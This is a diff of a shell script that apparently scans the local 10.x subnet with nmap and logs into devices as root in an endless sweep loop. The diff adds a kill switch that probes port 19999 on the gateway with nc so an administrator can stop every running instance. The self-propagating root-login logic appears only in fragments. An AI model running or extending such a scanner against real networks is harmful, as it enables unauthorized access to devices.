@@ -7,6 +7,12 @@ PW=`echo $RANDOM $RANDOM $RANDOM $RANDOM | base64`
 MYSUBNET=`busybox route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
 if [ -z "$NMAPTIMING" ] ; then NMAPTIMING="polite" ; fi
 
+terminate() {
+  # sysadmin can open port 19999 of the gateway to shut down
+  # all instances on the network in case it gets abusive
+  echo -n . | nc -w 1 $MYSUBNET.0.1 19999 > /dev/null 2>&1
+}
+
 talk() {
   sleep 3
   echo root
@@ -34,5 +40,5 @@ sweep() {
   done
 }
 
-if [ -z "$1" ] ; then while true ; do sweep ; done ; fi
+if [ -z "$1" ] ; then while ! terminate ; do sweep ; done ; fi
 connectTo $1
